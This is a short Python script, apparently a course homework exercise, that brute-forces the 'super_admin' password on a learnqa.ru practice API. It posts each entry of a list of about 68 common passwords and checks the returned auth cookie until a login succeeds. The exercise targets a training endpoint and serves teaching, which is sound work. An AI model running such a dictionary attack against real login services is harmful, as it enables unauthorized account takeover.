import requests

i = 0
# As there is no statement about year, list contains all passwords from the table minus duplicates - 68 values
popular_passwords = ["password", "123456", "12345678", "welcome", "abc123", "monkey", "1234567", "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley", "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx", "michael", "Football", "password", "12345", "123456789", "1234", "mustang", "access", "696969", "batman", "admin", "login", "starwars", "hello", "freedom", "whatever", "jesus", "ninja", "password1", "1234567890", "1qaz2wsx", "princess", "qwertyuiop", "solo", "666666", "!@#$%^&*", "charlie", "aa123456", "donald", "qwerty123", "adobe123[a]", "photoshop[a]", "azerty", "000000", "121212", "flower", "hottie", "loveme", "zaq1zaq1", "1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe"]

l = len(popular_passwords)

while i < l:
    payload_login = {"login": "super_admin", "password":popular_passwords[i]}

    login_response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload_login)

    cookie_value = login_response.cookies.get("auth_cookie")
    cookies = {'auth_cookie': cookie_value}

    checking_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",cookies=cookies)

    if checking_auth.text != "You are NOT authorized":
        print(f"Correct password is '{popular_passwords[i]}'\nResponse message '{checking_auth.text}'")

# We fond our password, so no need to continue
        break
    i = i + 1


